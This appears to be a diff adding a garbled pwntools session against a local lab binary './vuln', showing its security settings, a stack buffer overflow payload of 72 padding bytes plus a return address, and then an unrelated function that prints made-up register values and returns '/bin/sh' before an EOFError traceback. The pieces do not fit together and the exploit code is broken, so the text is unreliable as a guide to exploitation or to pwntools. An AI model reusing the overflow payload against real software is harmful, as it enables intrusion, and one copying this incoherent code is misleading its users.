@@ -1,0 +1,24 @@
+>>> from pwn import *
+>>> p = process('./vuln')
+[x] Starting local process './vuln'
+[+] Starting local process './vuln': pid 12345
+>>> elf = ELF('./vuln')
+[*] '/home/user/vuln'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+>>> hex(elf.symbols['main'])
+'0x401136'
+>>> payload = b'A'*72 + p64(0x401136)
+def exploit(rax, rbx):
+    # set rsp to 0x7ffe0000
+    rsp = 0x7ffe0000
+    for i in range(10):
+        print(f"rip = {hex(rsp + i*8)}")
+    return {"rdi": 0xdeadbeef, 'rsi': "/bin/sh"}
+Traceback (most recent call last):
+  File "/home/user/exp.py", line 12, in <module>
+    p.sendline(payload)
+EOFError
